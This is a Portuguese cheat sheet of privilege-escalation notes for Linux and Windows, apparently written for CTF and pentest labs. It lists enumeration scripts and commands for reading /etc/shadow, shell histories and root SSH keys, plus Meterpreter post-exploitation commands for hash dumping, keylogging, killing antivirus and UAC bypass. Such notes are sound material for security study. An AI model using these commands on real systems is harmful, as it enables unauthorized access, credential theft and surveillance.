# 🧬 Privilege Escalation - Anotações de Elevação de Privilégios

Este documento contém referências, comandos e dicas para **elevação de privilégios em ambientes Linux e Windows**, seja em CTFs, pentests ou laboratórios de estudo.

---

## 📜 Scripts de Enumeração (Linux / Windows)

Ferramentas automatizadas para levantamento de informações que possam levar à escalada de privilégios:

- 🔍 [PEASS-ng (LinPEAS / WinPEAS)](https://github.com/peass-ng/PEASS-ng)
- 🐧 [LinEnum](https://github.com/rebootuser/LinEnum)
- 🧪 [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
- 🪟 [Seatbelt (Windows)](https://github.com/GhostPack/Seatbelt)
- 🪟 [JAWS - Windows Privilege Escalation](https://github.com/411Hall/JAWS)

> ⚠️ **Atenção:** Esses scripts executam diversos comandos potencialmente detectáveis por antivírus ou sistemas de monitoramento. Em ambientes sensíveis ou reais, considere fazer **enumeração manual** para reduzir o "ruído".

---

## 🛠️ Dicas e Técnicas Gerais

Comandos e abordagens manuais úteis para escalada de privilégios.

### 🔑 Acesso via chave SSH do root

Verifique permissões da chave privada do root:

```bash
ls -ld /root/.ssh/id_rsa
```
Se tiver leitura, copie o conteúdo, salve como id_rsa localmente e:

```bash
chmod 600 id_rsa
ssh root@<IP> -i id_rsa
```
### 🔎 Enumeração de Sistema e Ambiente Linux

```bash

for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done (comparar os binários existentes com os de GTFObins para ver quais binários devemos investigar mais tarde)
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null (encontrar arquivos de histórico especiais criados por scripts ou programas)
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student    (todos os arquivos ocultos)
find / -type d -name ".*" -ls 2>/dev/null     (todos os diretorios ocultos)
find / -name flag.txt 2>/dev/null
grep --color=auto -rnw ‘/’ -ie “HTB” --color=always 2> /dev/null
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list    (é um pipeline pra gerar uma lista dos pacotes instalados no sistema, de um jeito mais “limpo”, e salvar isso num arquivo)
linpeas.sh
linenum.sh
cat /proc/version
sudo -V
cat /etc/fstab
grep "sh$" /etc/passwd
uname -a
route
ls -l /tmp /var/tmp /dev/shm
arp -a
lsb_release -a
ifconfig
ip a
cat /etc/shells
cat /etc/os-release
find / -perm -u=s -type f 2>/dev/null
ps aux | grep root
history
cat /etc/passwd
cat /etc/shadow
cat ~/.bash_history
sudo -l (Listar privilégios do usuário)
sudo su
lsblk
dpkg -l
ls -la /etc/cron.daily/
lsblk
echo $PATH
env
set
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null   (Encontre diretórios graváveis)
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null   (Encontre arquivos graváveis)




```
### 🔎 Enumeração de Sistema e Ambiente Windows

```bash
sysinfo
getuid
whoami /priv
getsystem
ps
getpid e depois migrate id_de_outro_processo_para_persisntecia
bypass de UAC
hashdump
Get-Content (Get-PSReadlineOption).HistorySavePath
```
### Meterpreter / Metasploit

```bash
run killav
screenshot
run vnc
keyscan_start
keyscan_dump
search -d C:/Users -f .pdf
download -r caminho
upload arquivo caminho
use multi/recon/local_exploit_suggester
```
### Others 

<img width="1015" height="437" alt="image" src="https://github.com/user-attachments/assets/48e87cbe-7be9-4707-804e-01b5d1258318" />


## 🌐 Sites e Recursos Úteis

- 🧠 [HackTricks](https://book.hacktricks.xyz/)  
  Guia abrangente sobre pentest, enumeração, privilege escalation, bypasses e muito mais.

- 📂 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)  
  Repositório com payloads organizados por categoria (XSS, LFI, privilege escalation, etc).

- 🔍 [GTFOBins](https://gtfobins.github.io/)  
  Abusa de binários comuns do Linux para executar comandos com escalada de privilégios.

- 🧬 [LOLBAS](https://lolbas-project.github.io/)  
  Coleta de binários nativos do Windows que podem ser abusados para execução arbitrária.

- 💣 [Exploit-DB (searchsploit)](https://www.exploit-db.com/)  
  Banco de dados de exploits — também acessível via CLI com o comando `searchsploit`.





